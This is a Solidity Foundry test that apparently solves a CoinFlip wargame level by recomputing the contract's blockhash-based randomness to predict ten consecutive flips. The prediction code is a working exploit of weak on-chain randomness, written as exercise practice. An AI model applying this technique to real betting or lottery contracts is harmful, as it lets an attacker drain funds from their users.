// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/CoinFlip.sol";

contract CounterTest is Test {
    CoinFlip public coinFlipContract;

    function setUp() public {
        coinFlipContract = new CoinFlip();
    }

    function test_ConsecutiveWinsShouldBe10() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        /*
        we will change the block number after every success full 
        transaction and at last we will check that the
        consecutiveWins state variable value equals to 10 or not 
        */
        for (uint i = 0; i < 10; i++) {
            // change the block number
            vm.roll(i + 1);
            // don't use i because block.number - 1 cause underflow
            /* just use the same logic which is used in CoinFlip contract to 
            find the correct number jusing this approach we can easily attack the contract  */
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            uint256 winBeforeGuess = coinFlipContract.consecutiveWins();
            coinFlipContract.flip(coinFlip == 1 ? true : false);
            uint256 winAfterGuess = coinFlipContract.consecutiveWins();
            assertEq(winBeforeGuess + 1, winAfterGuess);
        }
        uint256 wins = coinFlipContract.consecutiveWins();
        assertEq(wins, 10);
    }
}
